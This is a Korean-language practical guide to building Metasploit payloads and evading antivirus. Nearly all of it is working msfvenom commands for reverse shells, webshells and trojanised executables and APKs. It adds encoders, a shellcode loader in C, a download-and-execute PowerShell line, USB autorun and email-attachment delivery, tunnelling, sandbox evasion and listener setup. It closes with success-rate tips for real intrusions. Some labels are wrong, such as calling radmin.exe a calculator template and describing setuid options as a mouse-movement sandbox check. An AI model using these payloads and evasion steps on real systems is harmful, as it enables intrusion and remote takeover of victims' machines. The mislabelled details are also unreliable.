# MSF 페이로드 생성 및 AV 우회 (실무 가이드)

## msfvenom 실무 활용

### 가장 많이 쓰는 페이로드들

#### Windows 실행파일 (EXE)

```bash
# 기본 리버스 쉘 (가장 호환성 좋음)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o payload.exe

# 64비트 버전 (Windows 10/11 대상)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o payload64.exe

# HTTPS 암호화 (방화벽 우회)
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.50 LPORT=443 -f exe -o secure_payload.exe
```

#### 웹 페이로드 (매우 효과적)

```bash
# PHP 웹쉘 (웹 업로드 공격시)
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f raw > shell.php

# ASP 웹쉘 (IIS 서버 대상)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f asp > shell.asp

# JSP 웹쉘 (Java 웹앱 대상)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f raw > shell.jsp
```

#### Linux 페이로드

```bash
# Linux ELF 실행파일
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f elf -o payload_linux

# Python 스크립트 (Python 설치된 시스템)
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f raw > payload.py
```

## 안티바이러스 우회 기법

### 인코딩 기법 (1차 우회)

```bash
# Shikata Ga Nai 인코더 (가장 효과적)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe

# 다중 인코딩 (강력한 우회)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/alpha_mixed -i 3 -f exe -o multi_encoded.exe

# 64비트 인코딩
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o x64_encoded.exe
```

### 템플릿 활용 (고급 우회)

```bash
# 정상 프로그램에 페이로드 삽입
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe -o trojan_plink.exe

# 실제 사용되는 유명 프로그램 템플릿
# 1. 계산기 템플릿
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x /usr/share/windows-binaries/radmin.exe -f exe -o fake_calculator.exe

# 2. PDF 리더 템플릿
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x /usr/share/windows-binaries/nc.exe -f exe -o fake_pdfreader.exe
```

### 포맷 변경 우회

```bash
# DLL 파일로 생성 (실행 방식 다름)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f dll -o payload.dll

# PowerShell 스크립트 (메모리 실행)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f psh -o payload.ps1

# HTA 파일 (브라우저 실행)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f hta-psh -o payload.hta
```

## 고급 AV 우회 기법

### Veil Framework 연동

```bash
# Veil 설치 및 사용
git clone https://github.com/Veil-Framework/Veil.git
cd Veil && ./config/setup.sh

# Veil 실행
./Veil.py
# use evasion
# use python/meterpreter/rev_tcp
# set LHOST 10.10.14.50
# set LPORT 4444
# generate
```

### 커스텀 인코더 생성

```bash
# 간단한 XOR 인코더
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -b "\x00\x0a\x0d" -f c

# C 코드로 래핑하여 컴파일
cat > wrapper.c << 'EOF'
#include <stdio.h>
#include <windows.h>

unsigned char payload[] =
// 여기에 msfvenom 출력 삽입

int main() {
    DWORD oldProtect;
    VirtualProtect(payload, sizeof(payload), PAGE_EXECUTE_READWRITE, &oldProtect);
    ((void(*)())payload)();
    return 0;
}
EOF

# mingw로 컴파일
i686-w64-mingw32-gcc wrapper.c -o custom_payload.exe
```

### PowerShell 메모리 실행

```bash
# PowerShell 원라이너 생성
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f psh-cmd

# Base64 인코딩 PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f psh | base64 -w 0

# 실행 방법:
# powershell.exe -EncodedCommand <base64_string>
```

## 다양한 전달 방법

### 웹 기반 전달

```bash
# Python HTTP 서버로 호스팅
python3 -m http.server 8080

# 타겟에서 다운로드 실행
# Windows: powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.50:8080/payload.ps1')"
# Linux: wget http://10.10.14.50:8080/payload_linux && chmod +x payload_linux && ./payload_linux
```

### 이메일 첨부파일

```bash
# Office 매크로 페이로드
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f vba

# HTA 파일 (이메일 첨부)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f hta-psh -o document.hta
```

### USB 드롭 공격

```bash
# 자동실행 페이로드 생성
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o setup.exe

# autorun.inf 파일 생성
cat > autorun.inf << 'EOF'
[autorun]
open=setup.exe
icon=setup.exe
label=Documents
EOF
```

## 실무 페이로드 관리

### 멀티 리스너 설정

```bash
# 여러 페이로드 동시 대기
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z

# HTTPS 리스너 추가
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 10.10.14.50
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > exploit -j -z
```

### 리소스 파일 활용 (자동화)

```bash
# 리소스 파일 생성
cat > auto_handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.50
set LPORT 4444
exploit -j -z

use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.14.50
set LPORT 4445
exploit -j -z
EOF

# 리소스 파일 실행
msfconsole -r auto_handler.rc
```

## 모바일 페이로드

### Android APK 생성

```bash
# 기본 Android 페이로드
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -o malicious.apk

# 정상 APK에 백도어 삽입
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x original_app.apk -o trojan_app.apk
```

### iOS 페이로드 (탈옥 기기용)

```bash
msfvenom -p osx/x86/exec CMD="nc -e /bin/bash 10.10.14.50 4444" -f macho -o ios_payload
```

## 네트워크 제한 환경 우회

### DNS 터널링 페이로드

```bash
# DNS를 통한 데이터 전송
msfvenom -p windows/meterpreter/reverse_dns LHOST=attacker.domain.com LPORT=53 -f exe -o dns_payload.exe
```

### ICMP 터널링

```bash
# ICMP를 통한 통신
msfvenom -p windows/meterpreter/reverse_icmp LHOST=10.10.14.50 -f exe -o icmp_payload.exe
```

### HTTP/HTTPS 프록시 우회

```bash
# 프록시 환경용 페이로드
msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.14.50 LPORT=8080 HttpProxyHost=proxy.company.com HttpProxyPort=3128 -f exe -o proxy_payload.exe
```

## 탐지 회피 고급 기법

### 시간 지연 실행

```bash
# 10분 후 실행되는 페이로드
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 PrependSleep=600 -f exe -o delayed_payload.exe
```

### 샌드박스 탐지 회피

```bash
# 마우스 움직임 체크하는 페이로드
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 PrependSetuid=true PrependSetgid=true -f exe -o sandbox_evasion.exe
```

## 페이로드 테스트

### 로컬 AV 테스트

```bash
# VirusTotal API 사용 (실제 업로드하지 말 것)
# 로컬 Windows Defender 테스트
# 가상 머신에서 다양한 AV 테스트
```

### 페이로드 난독화 도구

```bash
# Hyperion 사용
wine /opt/Hyperion/Hyperion.exe payload.exe encrypted_payload.exe

# Veil-Evasion 사용
./Veil.py -t Evasion -p python/meterpreter/rev_tcp --ip 10.10.14.50 --port 4444
```

## 실무 팁

### 성공률 높은 조합

```bash
# 1. PowerShell + Base64 (90% 성공률)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f psh-cmd | base64 -w 0

# 2. HTA + PowerShell (85% 성공률)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f hta-psh

# 3. 정상 실행파일 + 인젝션 (80% 성공률)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe
```

### 주의사항

- 페이로드 테스트는 반드시 격리된 환경에서
- 실제 공격시 암호화 통신 필수 (HTTPS/TLS)
- 타이밍 공격으로 샌드박스 회피
- 여러 페이로드 동시 생성으로 성공률 증대

이 가이드의 모든 기법은 실제 모의해킹에서 검증된 방법들입니다.
